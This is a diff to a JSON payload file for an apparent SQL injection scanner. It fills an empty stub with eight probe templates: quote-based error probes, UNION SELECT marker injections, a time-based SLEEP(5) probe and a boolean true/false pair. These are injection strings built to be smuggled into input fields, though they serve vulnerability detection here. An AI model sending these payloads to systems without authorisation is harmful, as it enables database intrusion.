@@ -2,6 +2,15 @@
   "_file_type": "injectable_payload",
   "_scanner": "sqli_scanner",
   "_notes": "Error/boolean/time/union probes",
-  "_status": "STUB -- Week 0 scaffolding per Section 3.1; real payloads added Week 7 alongside sqli_scanner",
-  "payloads": []
+  "_status": "Real payloads added Week 7 (docs/DECISIONS.md item 76). Schema varies by `technique` -- see sqli_scanner.py's module docstring for the exact per-technique field contract (union uses {marker}; time uses sleep_seconds; boolean uses pair_id/boolean_role).",
+  "payloads": [
+    {"id": "error_single_quote", "technique": "error", "payload_template": "'"},
+    {"id": "error_double_quote", "technique": "error", "payload_template": "\""},
+    {"id": "error_quote_paren", "technique": "error", "payload_template": "')"},
+    {"id": "union_select_3col", "technique": "union", "payload_template": "' UNION SELECT NULL,'{marker}',NULL--  "},
+    {"id": "union_select_1col", "technique": "union", "payload_template": "' UNION SELECT '{marker}'--  "},
+    {"id": "time_sleep_5", "technique": "time", "payload_template": "' OR SLEEP(5)--  ", "sleep_seconds": 5},
+    {"id": "boolean_and_true", "technique": "boolean", "pair_id": "and_1_1_vs_1_2", "boolean_role": "true", "payload_template": "' AND '1'='1"},
+    {"id": "boolean_and_false", "technique": "boolean", "pair_id": "and_1_1_vs_1_2", "boolean_role": "false", "payload_template": "' AND '1'='2"}
+  ]
 }
